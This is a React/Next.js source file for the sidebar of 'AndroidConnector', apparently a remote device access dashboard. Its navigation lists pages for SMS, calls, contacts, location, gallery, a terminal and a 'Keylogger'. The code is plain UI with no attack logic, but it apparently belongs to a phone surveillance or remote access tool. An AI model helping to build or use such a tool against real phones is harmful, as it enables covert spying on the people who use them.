'use client'
import Link from 'next/link'
import { usePathname } from 'next/navigation'
import {
  LayoutDashboard, Terminal, FolderOpen,
  Settings, Smartphone, Wifi, WifiOff, ChevronDown,
  MessageSquare, Phone, Users, MapPin, Package, Image, Bell, KeySquare,
} from 'lucide-react'
import { useState } from 'react'

interface DeviceItem {
  deviceId: string
  deviceName: string
  connected: boolean
  model?: string
}

interface SidebarProps {
  connected: boolean
  devices?: DeviceItem[]
  selectedId?: string | null
  onSelect?: (id: string) => void
}

const navItems = [
  { href: '/', label: 'Dashboard', icon: LayoutDashboard },
  { href: '/terminal', label: 'Terminal', icon: Terminal },
  { href: '/files', label: 'Files', icon: FolderOpen },
  { href: '/gallery', label: 'Gallery', icon: Image },
  { href: '/sms', label: 'SMS', icon: MessageSquare },
  { href: '/calls', label: 'Calls', icon: Phone },
  { href: '/contacts', label: 'Contacts', icon: Users },
  { href: '/location', label: 'Location', icon: MapPin },
  { href: '/apps', label: 'Apps', icon: Package },
  { href: '/notifications', label: 'Notifikasi', icon: Bell },
  { href: '/keylog', label: 'Keylogger', icon: KeySquare },
  { href: '/setup', label: 'Setup', icon: Settings },
]

const mobileNavItems = [
  { href: '/', label: 'Dashboard', icon: LayoutDashboard },
  { href: '/terminal', label: 'Terminal', icon: Terminal },
  { href: '/sms', label: 'SMS', icon: MessageSquare },
  { href: '/notifications', label: 'Notifikasi', icon: Bell },
  { href: '/location', label: 'Location', icon: MapPin },
  { href: '/apps', label: 'Apps', icon: Package },
]

export default function Sidebar({ connected, devices = [], selectedId, onSelect }: SidebarProps) {
  const pathname = usePathname()
  const [showPicker, setShowPicker] = useState(false)

  const selected = devices.find(d => d.deviceId === selectedId)
  const multiDevice = devices.length > 1

  const DeviceBadge = () => (
    <div className={`flex items-center gap-2 px-3 py-2 rounded-lg text-xs font-medium ${
      connected
        ? 'bg-android-green/10 text-android-green border border-android-green/20'
        : 'bg-android-red/10 text-android-red border border-android-red/20'
    }`}>
      {connected ? <Wifi size={13} /> : <WifiOff size={13} />}
      <span className="flex-1 truncate">
        {connected ? (selected?.deviceName ?? 'Device Connected') : 'No Device'}
      </span>
      <div className={`w-2 h-2 rounded-full shrink-0 ${connected ? 'bg-android-green status-dot-online' : 'bg-android-red'}`} />
    </div>
  )

  return (
    <>
      {/* ─── DESKTOP SIDEBAR ─── */}
      <aside className="hidden md:flex w-56 min-h-screen bg-android-surface border-r border-android-border flex-col shrink-0">
        <div className="px-4 py-4 border-b border-android-border">
          <div className="flex items-center gap-3">
            <div className="w-8 h-8 rounded-xl bg-android-green flex items-center justify-center shrink-0">
              <Smartphone size={16} className="text-android-bg" />
            </div>
            <div className="min-w-0">
              <h1 className="text-sm font-bold text-white leading-tight">AndroidConnector</h1>
              <p className="text-xs text-android-muted leading-tight">Remote Device Access</p>
            </div>
          </div>
        </div>

        {/* Device selector */}
        <div className="px-3 py-3 border-b border-android-border">
          {multiDevice ? (
            <div className="relative">
              <button
                onClick={() => setShowPicker(v => !v)}
                className={`w-full flex items-center gap-2 px-3 py-2 rounded-lg text-xs font-medium border transition-colors ${
                  connected
                    ? 'bg-android-green/10 text-android-green border-android-green/20'
                    : 'bg-android-red/10 text-android-red border-android-red/20'
                }`}
              >
                {connected ? <Wifi size={13} /> : <WifiOff size={13} />}
                <span className="flex-1 truncate text-left">
                  {selected?.deviceName ?? 'Select device'}
                </span>
                <ChevronDown size={12} className={`shrink-0 transition-transform ${showPicker ? 'rotate-180' : ''}`} />
              </button>

              {showPicker && (
                <div className="absolute top-full left-0 right-0 mt-1 bg-android-bg border border-android-border rounded-lg z-50 overflow-hidden shadow-lg">
                  {devices.map(d => (
                    <button
                      key={d.deviceId}
                      onClick={() => { onSelect?.(d.deviceId); setShowPicker(false) }}
                      className={`w-full flex items-center gap-2 px-3 py-2.5 text-xs text-left transition-colors hover:bg-white/5 ${
                        d.deviceId === selectedId ? 'text-android-green' : 'text-android-muted'
                      }`}
                    >
                      <div className={`w-2 h-2 rounded-full shrink-0 ${d.connected ? 'bg-android-green' : 'bg-android-muted'}`} />
                      <span className="truncate">{d.deviceName}</span>
                    </button>
                  ))}
                </div>
              )}
            </div>
          ) : (
            <DeviceBadge />
          )}
        </div>

        <nav className="flex-1 px-2 py-3 space-y-0.5 overflow-y-auto">
          {navItems.map(({ href, label, icon: Icon }) => {
            const active = pathname === href
            return (
              <Link key={href} href={href} className={`flex items-center gap-2.5 px-3 py-2 rounded-lg text-xs font-medium transition-colors ${
                active
                  ? 'bg-android-green/10 text-android-green border border-android-green/20'
                  : 'text-android-muted hover:text-android-text hover:bg-white/5'
              }`}>
                <Icon size={15} />
                {label}
              </Link>
            )
          })}
        </nav>

        <div className="px-4 py-3 border-t border-android-border">
          <p className="text-xs text-android-muted">AndroidConnector v0.4.0</p>
          <p className="text-xs text-android-muted/60 mt-0.5">by Kztutorial99</p>
        </div>
      </aside>

      {/* ─── MOBILE HEADER ─── */}
      <header className="md:hidden fixed top-0 left-0 right-0 z-40 bg-android-surface border-b border-android-border px-4 h-14 flex items-center justify-between">
        <div className="flex items-center gap-2.5">
          <div className="w-7 h-7 rounded-lg bg-android-green flex items-center justify-center">
            <Smartphone size={14} className="text-android-bg" />
          </div>
          <span className="text-sm font-bold text-white">AndroidConnector</span>
        </div>

        {multiDevice ? (
          <div className="relative">
            <button
              onClick={() => setShowPicker(v => !v)}
              className="flex items-center gap-1.5 text-xs font-medium px-2.5 py-1.5 rounded-full border border-android-border text-android-muted"
            >
              <div className={`w-1.5 h-1.5 rounded-full ${connected ? 'bg-android-green' : 'bg-android-red'}`} />
              <span className="max-w-[80px] truncate">{selected?.deviceName ?? 'Device'}</span>
              <ChevronDown size={10} />
            </button>
            {showPicker && (
              <div className="absolute top-full right-0 mt-1 w-48 bg-android-surface border border-android-border rounded-lg z-50 overflow-hidden shadow-lg">
                {devices.map(d => (
                  <button key={d.deviceId} onClick={() => { onSelect?.(d.deviceId); setShowPicker(false) }}
                    className={`w-full flex items-center gap-2 px-3 py-2.5 text-xs text-left ${d.deviceId === selectedId ? 'text-android-green' : 'text-android-muted'}`}>
                    <div className={`w-2 h-2 rounded-full ${d.connected ? 'bg-android-green' : 'bg-android-muted'}`} />
                    <span className="truncate">{d.deviceName}</span>
                  </button>
                ))}
              </div>
            )}
          </div>
        ) : (
          <div className={`flex items-center gap-1.5 text-xs font-medium px-2.5 py-1.5 rounded-full border ${
            connected ? 'text-android-green border-android-green/30 bg-android-green/10' : 'text-android-red border-android-red/30 bg-android-red/10'
          }`}>
            <div className={`w-1.5 h-1.5 rounded-full ${connected ? 'bg-android-green status-dot-online' : 'bg-android-red'}`} />
            {connected ? 'Online' : 'Offline'}
          </div>
        )}
      </header>

      {/* ─── MOBILE BOTTOM NAV ─── */}
      <nav className="md:hidden fixed bottom-0 left-0 right-0 z-40 bg-android-surface border-t border-android-border flex">
        {mobileNavItems.map(({ href, label, icon: Icon }) => {
          const active = pathname === href
          return (
            <Link key={href} href={href} className={`flex-1 flex flex-col items-center justify-center py-2 gap-0.5 transition-colors ${active ? 'text-android-green' : 'text-android-muted'}`}>
              <Icon size={18} />
              <span className="text-[9px] font-medium leading-none">{label}</span>
            </Link>
          )
        })}
      </nav>
    </>
  )
}
